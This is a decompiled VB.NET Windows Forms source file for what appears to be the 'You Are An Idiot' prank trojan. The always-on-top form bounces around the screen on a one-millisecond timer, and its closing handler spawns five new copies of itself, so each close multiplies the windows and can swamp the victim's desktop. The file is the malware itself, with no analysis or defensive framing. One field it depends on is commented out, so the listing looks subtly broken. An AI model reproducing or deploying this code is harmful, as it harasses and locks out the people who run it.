Imports AxShockwaveFlashObjects
Imports Microsoft.VisualBasic
Imports Microsoft.VisualBasic.CompilerServices
Imports System
Imports System.Collections.Generic
Imports System.ComponentModel
Imports System.Diagnostics
Imports System.Drawing
Imports System.Runtime.CompilerServices
Imports System.Windows.Forms
Imports System.Windows.Forms.AxHost

Namespace YouAreAnIdiot
    <DesignerGenerated> _
    Partial Public Class HAHA
        Inherits Form
        ' Methods
        <DebuggerNonUserCode> _
        Public Sub New()
            AddHandler MyBase.Load, New EventHandler(AddressOf Me.HAHA_Load)
            AddHandler MyBase.Closing, New CancelEventHandler(AddressOf Me.HAHA_Closing)
            HAHA.__ENCAddToList(Me)
            Me.InitializeComponent()
        End Sub

        <DebuggerNonUserCode> _
        Private Shared Sub __ENCAddToList(ByVal value As Object)
            Dim list As List(Of WeakReference) = HAHA.__ENCList
            SyncLock list
                If (HAHA.__ENCList.Count = HAHA.__ENCList.Capacity) Then
                    Dim index As Integer = 0
                    Dim num3 As Integer = (HAHA.__ENCList.Count - 1)
                    Dim i As Integer = 0
                    Do While (i <= num3)
                        Dim reference As WeakReference = HAHA.__ENCList.Item(i)
                        If reference.IsAlive Then
                            If (i <> index) Then
                                HAHA.__ENCList.Item(index) = HAHA.__ENCList.Item(i)
                            End If
                            index += 1
                        End If
                        i += 1
                    Loop
                    HAHA.__ENCList.RemoveRange(index, (HAHA.__ENCList.Count - index))
                    HAHA.__ENCList.Capacity = HAHA.__ENCList.Count
                End If
                HAHA.__ENCList.Add(New WeakReference(RuntimeHelpers.GetObjectValue(value)))
            End SyncLock
        End Sub

        Private Sub Button1_Click(ByVal sender As Object, ByVal e As EventArgs)
            Me.MovingWindow.Enabled = True
        End Sub

        <DebuggerNonUserCode> _
        Protected Overrides Sub Dispose(ByVal disposing As Boolean)
            Try
                If (disposing AndAlso (Not Me.components Is Nothing)) Then
                    Me.components.Dispose()
                End If
            Finally
                MyBase.Dispose(disposing)
            End Try
        End Sub

        Private Sub HAHA_Closing(ByVal sender As Object, ByVal e As CancelEventArgs)
            Dim haha As New HAHA
            Dim haha2 As New HAHA
            Dim haha3 As New HAHA
            Dim haha4 As New HAHA
            Dim haha5 As New HAHA
            haha.Show()
            haha2.Show()
            haha3.Show()
            haha4.Show()
            haha5.Show()
        End Sub

        Private Sub HAHA_Load(ByVal sender As Object, ByVal e As EventArgs)
        End Sub

        <DebuggerStepThrough> _
        Private Sub InitializeComponent()
            Me.components = New Container
            Dim manager As New ComponentResourceManager(GetType(HAHA))
            Me.MovingWindow = New Timer(Me.components)
            Me.Label1 = New Label
            Me.Label2 = New Label
            Me.MoveX = New Label
            Me.MoveY = New Label
            Me.Y = New Label
            Me.X = New Label
            Me.AxShockwaveFlash1 = New AxShockwaveFlash
            Me.AxShockwaveFlash1.BeginInit()
            Me.SuspendLayout()
            Me.MovingWindow.Enabled = True
            Me.MovingWindow.Interval = 1
            Me.Label1.AutoSize = True
            Me.Label1.Font = New Font("Verdana", 12.0!)
            Dim point2 As New Point(5, &HE4)
            Me.Label1.Location = point2
            Me.Label1.Name = "Label1"
            Dim size2 As New Size(&HB9, &H12)
            Me.Label1.Size = size2
            Me.Label1.TabIndex = 3
            Me.Label1.Text = "Position:  x=        y="
            Me.Label2.AutoSize = True
            Me.Label2.Font = New Font("Verdana", 12.0!)
            point2 = New Point(14, &H103)
            Me.Label2.Location = point2
            Me.Label2.Name = "Label2"
            size2 = New Size(&HB0, &H12)
            Me.Label2.Size = size2
            Me.Label2.TabIndex = 6
            Me.Label2.Text = "Moving:  x=        y="
            Me.MoveX.AutoSize = True
            Me.MoveX.Font = New Font("Verdana", 12.0!)
            point2 = New Point(&H70, &H103)
            Me.MoveX.Location = point2
            Me.MoveX.Name = "MoveX"
            size2 = New Size(&H12, &H12)
            Me.MoveX.Size = size2
            Me.MoveX.TabIndex = 7
            Me.MoveX.Text = "1"
            Me.MoveY.AutoSize = True
            Me.MoveY.Font = New Font("Verdana", 12.0!)
            point2 = New Point(&HB8, &H103)
            Me.MoveY.Location = point2
            Me.MoveY.Name = "MoveY"

            Me.MoveY.Size = size2
            Me.MoveY.TabIndex = 8
            Me.MoveY.Text = "1"
            Me.Y.AutoSize = True
            Me.Y.Font = New Font("Verdana", 12.0!, FontStyle.Regular, GraphicsUnit.Point, 0)
            point2 = New Point(&HB8, &HE4)
            Me.Y.Location = point2
            Me.Y.Name = "Y"

            Me.Y.Size = size2
            Me.Y.TabIndex = 10
            Me.Y.Text = "0"
            Me.X.AutoSize = True
            Me.X.Font = New Font("Verdana", 12.0!)
            point2 = New Point(&H70, &HE4)
            Me.X.Location = point2
            Me.X.Name = "X"

            Me.X.Size = size2
            Me.X.TabIndex = 9
            Me.X.Text = "0"
            Me.AxShockwaveFlash1.AccessibleDescription = ""
            Me.AxShockwaveFlash1.AccessibleName = ""
            Me.AxShockwaveFlash1.Enabled = True
            point2 = New Point(1, 0)
            Me.AxShockwaveFlash1.Location = point2
            Dim padding2 As New Padding(0)
            Me.AxShockwaveFlash1.Margin = padding2
            Me.AxShockwaveFlash1.Name = "AxShockwaveFlash1"
            Me.AxShockwaveFlash1.OcxState = DirectCast(manager.GetObject("AxShockwaveFlash1.OcxState"), State)
            size2 = New Size(&H11D, 210)
            Me.AxShockwaveFlash1.Size = size2
            Me.AxShockwaveFlash1.TabIndex = 11
            Dim ef2 As New SizeF(6.0!, 12.0!)
            Me.AutoScaleDimensions = ef2
            Me.AutoScaleMode = AutoScaleMode.Font
            Me.BackColor = SystemColors.Window
            size2 = New Size(&H11C, &HD3)
            Me.ClientSize = size2
            Me.Controls.Add(Me.AxShockwaveFlash1)
            Me.Controls.Add(Me.Y)
            Me.Controls.Add(Me.X)
            Me.Controls.Add(Me.MoveY)
            Me.Controls.Add(Me.MoveX)
            Me.Controls.Add(Me.Label2)
            Me.Controls.Add(Me.Label1)
            Me.FormBorderStyle = FormBorderStyle.FixedSingle
            Me.Icon = DirectCast(manager.GetObject("$this.Icon"), Icon)
            Me.MaximizeBox = False
            Me.MinimizeBox = False
            Me.Name = "HAHA"
            Me.TopMost = True
            Me.AxShockwaveFlash1.EndInit()
            Me.ResumeLayout(False)
            Me.PerformLayout()
        End Sub

        Private Sub Label1_Click(ByVal sender As Object, ByVal e As EventArgs)
        End Sub

        Private Sub Label1_Click_1(ByVal sender As Object, ByVal e As EventArgs)
        End Sub

        Private Sub Label2_Click(ByVal sender As Object, ByVal e As EventArgs)
        End Sub

        Private Sub Timer1_Tick(ByVal sender As Object, ByVal e As EventArgs)
            Dim workingArea As Rectangle = SystemInformation.WorkingArea
            Dim num3 As Integer = (Screen.PrimaryScreen.Bounds.Width - Me.Width)
            Dim height As Integer = Screen.PrimaryScreen.Bounds.Height
            Dim num As Integer = Conversions.ToInteger(Me.MoveX.Text)
            Dim num2 As Integer = Conversions.ToInteger(Me.MoveY.Text)
            If (Conversions.ToDouble(Me.X.Text) >= num3) Then
                Me.MoveX.Text = Conversions.ToString(CInt((0 - ((1 + CInt(Math.Round(CDbl((34.0! * VBMath.Rnd))))) * 1))))
                If (Conversions.ToDouble(Me.MoveY.Text) < 0) Then
                    Me.MoveY.Text = Conversions.ToString(CInt((0 - ((1 + CInt(Math.Round(CDbl((34.0! * VBMath.Rnd))))) * 1))))
                ElseIf (Conversions.ToDouble(Me.MoveY.Text) > 0) Then
                    Me.MoveY.Text = Conversions.ToString(CInt(((1 + CInt(Math.Round(CDbl((34.0! * VBMath.Rnd))))) * 1)))
                End If
            End If
            If (Conversions.ToDouble(Me.Y.Text) >= (height - Me.Height)) Then
                Me.MoveY.Text = Conversions.ToString(CInt((0 - ((1 + CInt(Math.Round(CDbl((34.0! * VBMath.Rnd))))) * 1))))
                If (Conversions.ToDouble(Me.MoveX.Text) < 0) Then
                    Me.MoveX.Text = Conversions.ToString(CInt((0 - ((1 + CInt(Math.Round(CDbl((34.0! * VBMath.Rnd))))) * 1))))
                ElseIf (Conversions.ToDouble(Me.MoveX.Text) > 0) Then
                    Me.MoveX.Text = Conversions.ToString(CInt(((1 + CInt(Math.Round(CDbl((34.0! * VBMath.Rnd))))) * 1)))
                End If
            End If
            If (Conversions.ToDouble(Me.X.Text) <= 0) Then
                Me.MoveX.Text = Conversions.ToString(CInt(((1 + CInt(Math.Round(CDbl((34.0! * VBMath.Rnd))))) * 1)))
                If (Conversions.ToDouble(Me.MoveY.Text) < 0) Then
                    Me.MoveY.Text = Conversions.ToString(CInt((0 - ((1 + CInt(Math.Round(CDbl((34.0! * VBMath.Rnd))))) * 1))))
                ElseIf (Conversions.ToDouble(Me.MoveY.Text) > 0) Then
                    Me.MoveY.Text = Conversions.ToString(CInt(((1 + CInt(Math.Round(CDbl((34.0! * VBMath.Rnd))))) * 1)))
                End If
            End If
            If (Conversions.ToDouble(Me.Y.Text) <= 0) Then
                Me.MoveY.Text = Conversions.ToString(CInt(((1 + CInt(Math.Round(CDbl((34.0! * VBMath.Rnd))))) * 1)))
                If (Conversions.ToDouble(Me.MoveY.Text) < 0) Then
                    Me.MoveY.Text = Conversions.ToString(CInt((0 - ((1 + CInt(Math.Round(CDbl((34.0! * VBMath.Rnd))))) * 1))))
                ElseIf (Conversions.ToDouble(Me.MoveY.Text) > 0) Then
                    Me.MoveY.Text = Conversions.ToString(CInt(((1 + CInt(Math.Round(CDbl((34.0! * VBMath.Rnd))))) * 1)))
                End If
            End If
            Me.X.Text = Conversions.ToString(CDbl((Conversions.ToDouble(Me.X.Text) + num)))
            Me.Y.Text = Conversions.ToString(CDbl((Conversions.ToDouble(Me.Y.Text) + num2)))
            Dim point2 As New Point(Conversions.ToInteger(Me.X.Text), Conversions.ToInteger(Me.Y.Text))
            Me.Location = point2
        End Sub


        ' Properties
        Friend Overridable Property AxShockwaveFlash1 As AxShockwaveFlash
            <DebuggerNonUserCode> _
            Get
                Return Me._AxShockwaveFlash1
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal WithEventsValue As AxShockwaveFlash)
                Me._AxShockwaveFlash1 = WithEventsValue
            End Set
        End Property

        Friend Overridable Property Label1 As Label
            <DebuggerNonUserCode> _
            Get
                Return Me._Label1
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal WithEventsValue As Label)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.Label1_Click_1)
                If (Not Me._Label1 Is Nothing) Then
                    RemoveHandler Me._Label1.Click, handler
                End If
                Me._Label1 = WithEventsValue
                If (Not Me._Label1 Is Nothing) Then
                    AddHandler Me._Label1.Click, handler
                End If
            End Set
        End Property

        Friend Overridable Property Label2 As Label
            <DebuggerNonUserCode> _
            Get
                Return Me._Label2
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal WithEventsValue As Label)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.Label2_Click)
                If (Not Me._Label2 Is Nothing) Then
                    RemoveHandler Me._Label2.Click, handler
                End If
                Me._Label2 = WithEventsValue
                If (Not Me._Label2 Is Nothing) Then
                    AddHandler Me._Label2.Click, handler
                End If
            End Set
        End Property

        Friend Overridable Property MoveX As Label
            <DebuggerNonUserCode> _
            Get
                Return Me._MoveX
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal WithEventsValue As Label)
                Me._MoveX = WithEventsValue
            End Set
        End Property

        Friend Overridable Property MoveY As Label
            <DebuggerNonUserCode> _
            Get
                Return Me._MoveY
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal WithEventsValue As Label)
                Me._MoveY = WithEventsValue
            End Set
        End Property

        Friend Overridable Property MovingWindow As Timer
            <DebuggerNonUserCode> _
            Get
                Return Me._MovingWindow
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal WithEventsValue As Timer)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.Timer1_Tick)
                If (Not Me._MovingWindow Is Nothing) Then
                    RemoveHandler Me._MovingWindow.Tick, handler
                End If
                Me._MovingWindow = WithEventsValue
                If (Not Me._MovingWindow Is Nothing) Then
                    AddHandler Me._MovingWindow.Tick, handler
                End If
            End Set
        End Property

        Friend Overridable Property X As Label
            <DebuggerNonUserCode> _
            Get
                Return Me._X
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal WithEventsValue As Label)
                Me._X = WithEventsValue
            End Set
        End Property

        Friend Overridable Property Y As Label
            <DebuggerNonUserCode> _
            Get
                Return Me._Y
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal WithEventsValue As Label)
                Me._Y = WithEventsValue
            End Set
        End Property


        ' Fields
        ' Private Shared __ENCList As List(Of WeakReference) = New List(Of WeakReference)
        <AccessedThroughProperty("AxShockwaveFlash1")> _
        Private _AxShockwaveFlash1 As AxShockwaveFlash
        <AccessedThroughProperty("Label1")> _
        Private _Label1 As Label
        <AccessedThroughProperty("Label2")> _
        Private _Label2 As Label
        <AccessedThroughProperty("MoveX")> _
        Private _MoveX As Label
        <AccessedThroughProperty("MoveY")> _
        Private _MoveY As Label
        <AccessedThroughProperty("MovingWindow")> _
        Private _MovingWindow As Timer
        <AccessedThroughProperty("X")> _
        Private _X As Label
        <AccessedThroughProperty("Y")> _
        Private _Y As Label
        Private components As IContainer
    End Class
End Namespace

